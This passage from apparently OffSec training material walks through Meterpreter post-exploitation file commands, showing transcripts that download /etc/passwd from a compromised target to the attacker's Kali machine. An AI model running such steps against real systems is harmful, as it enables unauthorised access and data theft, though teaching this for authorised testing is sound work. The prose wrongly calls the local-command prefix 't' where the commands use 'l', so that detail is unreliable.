# # OffSec Upload a file or directory

upload

Listing 656 - List all File system Commands of Meterpreter

Listing 656 shows us various commands that we can use to upload, download, or manage files on the local and target system. Commands with "t" as prefix on the local system; in our case use Kali VM. For example, we can use these commands to change the directory to we want to download or upload files.

Let's download /etc/passwd from the target machine to our Kali system. For this, we will change the local directory to /home/kali/Downloads first. Then, we will enter the download command and /etc/passwd as argument.

```
meterpreter > lpwd
/home/kali/

meterpreter > lcd /home/kali/Downloads

meterpreter > lpwd
/home/kali/Downloads

meterpreter > download /etc/passwd
[*] Downloading: /etc/passwd ~ /home/kali/Downloads/passwd
[*] Downloaded 1.74 KiB of 1.74 KiB (100.0%): /etc/passwd ->
/home/kali/Downloads/passwd
[*] download : /etc/passwd ~ /home/kali/Downloads
```

```
meterpreter > cat /home/kali/Downloads/passwd
root:x:0:0:/root:/bin/bash
```

Listing 657 - Change local directory and download /etc/passwd from the target machine

Listing 657 shows that we can successfully download /etc/passwd to our local machine.
